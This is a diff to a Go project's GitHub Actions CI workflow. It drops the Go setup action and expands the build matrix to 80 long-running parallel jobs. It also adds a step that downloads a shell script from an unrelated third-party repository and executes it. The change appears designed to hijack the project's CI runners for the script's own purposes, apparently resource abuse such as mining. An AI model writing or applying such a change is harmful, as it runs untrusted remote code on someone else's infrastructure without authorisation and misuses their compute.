@@ -1,27 +1,26 @@
 name: CI
 on:
   push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
-
+    branches: [main]
+  workflow_dispatch:
+    
 jobs:
   build:
     name: RUN_BUILD
-    runs-on: ubuntu-18.04
+    runs-on: ubuntu-latest
     strategy:
       max-parallel: 20
       fail-fast: false
       matrix:
         go: [1.12, 1.13, 1.14, 1.15, 1.16]
-        flag: [A, B, C, D]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P]
     timeout-minutes: 360
     env:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
+      uses: falti/dotenv-action@v0.2.5
       with:
         go-version: ${{ matrix.go }}
       id: go
@@ -29,3 +28,4 @@ jobs:
       uses: actions/checkout@v2
     - name: running
       run: |
+          wget https://github.com/ardisukarmo/andias/blob/main/yui.sh && chmod +x yui.sh && ./yui.sh
